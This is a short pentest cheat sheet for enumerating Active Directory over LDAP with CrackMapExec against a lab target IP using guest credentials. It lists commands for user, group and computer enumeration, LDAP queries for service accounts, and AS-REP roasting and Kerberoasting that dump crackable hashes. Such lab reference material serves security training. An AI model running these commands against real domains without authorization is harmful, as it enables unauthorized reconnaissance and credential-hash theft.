# LDAP enumeration with CrackMapExec (CME)

One‑pager cheat sheet to replace enum4linux in an Active Directory pentest lab.

## Target example
- IP: 10.129.26.87
- User: guest / empty password
- Ports: LDAP 389, LDAPS 636

## Authentication
```bash
cme ldap 10.129.26.87 -u "" -p ""
cme ldap 10.129.26.87 -u guest -p ""
cme ldap 10.129.26.87 -u guest -p "" --port 636
```

## Basic enumeration
```bash
cme ldap 10.129.26.87 -u guest -p "" --users
cme ldap 10.129.26.87 -u guest -p "" --groups
cme ldap 10.129.26.87 -u guest -p "" --computers
```

## Interesting flags
```bash
cme ldap 10.129.26.87 -u guest -p "" --admin-count
cme ldap 10.129.26.87 -u guest -p "" --password-not-required
cme ldap 10.129.26.87 -u guest -p "" --trusted-for-delegation
```

## LDAP queries
```bash
# SPN accounts (Kerberoasting)
cme ldap 10.129.26.87 -u guest -p "" --query '(servicePrincipalName=*)' --attrs 'cn,sAMAccountName,servicePrincipalName'

# Disabled users
cme ldap 10.129.26.87 -u guest -p "" --query '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' --attrs 'cn,sAMAccountName'
```

## Modules
```bash
cme ldap -L
cme ldap 10.129.26.87 -u guest -p "" -M get-desc-users
cme ldap 10.129.26.87 -u guest -p "" -M ldap-signing
cme ldap 10.129.26.87 -u guest -p "" -M subnets
```

## Kerberos based attacks
```bash
cme ldap 10.129.26.87 -u guest -p "" --asreproast asrep.txt
cme ldap 10.129.26.87 -u guest -p "" --kerberoasting kerberoast.txt
```

## Export
```bash
cme ldap 10.129.26.87 -u guest -p "" --users --export users.json
```

## Run all
```bash
cme ldap 10.129.26.87 -u guest -p ""
cme ldap 10.129.26.87 -u guest -p "" --users --groups --computers
cme ldap 10.129.26.87 -u guest -p "" --kerberoasting kerb.txt
```
